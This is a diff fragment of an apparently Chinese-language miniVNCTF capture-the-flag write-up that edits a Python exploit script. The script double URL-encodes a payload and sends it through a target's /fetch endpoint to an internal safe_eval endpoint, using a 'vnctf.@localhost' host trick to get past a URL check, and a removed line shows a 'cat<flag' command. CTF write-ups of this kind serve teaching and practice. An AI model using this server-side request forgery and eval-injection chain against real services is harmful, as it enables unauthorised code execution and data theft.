@@ -197,8 +197,6 @@ payload = (
     # 4. 读取结果
     ".read()"
 )
-
-print(f"[*] 正在尝试执行: cat<flag")
 print(f"[*] Payload 长度: {len(payload)} (限制 304)") # 检查长度，这很重要
 
 # 1. 手动url编码
@@ -210,9 +208,8 @@ pass_2_encode = pass_1_encode.replace("%", "%25")
 full_url = f"{TARGET_URL}/fetch?url=http://vnctf.@localhost:8080/__internal/safe_eval?hi={pass_2_encode}"
 
 # 4. 发送
-try:
-    res = requests.get(full_url)
-    print(f"\n[+]  执行结果:\n{res.text}")
-except Exception as e:
-    print(f"[-] Error: {e}")
+res = requests.get(full_url)
+print(f"\n[+]  执行结果:\n{res.text}")
+
 ```
+![](assets/miniVNCTF/file-20251207170036464.png)
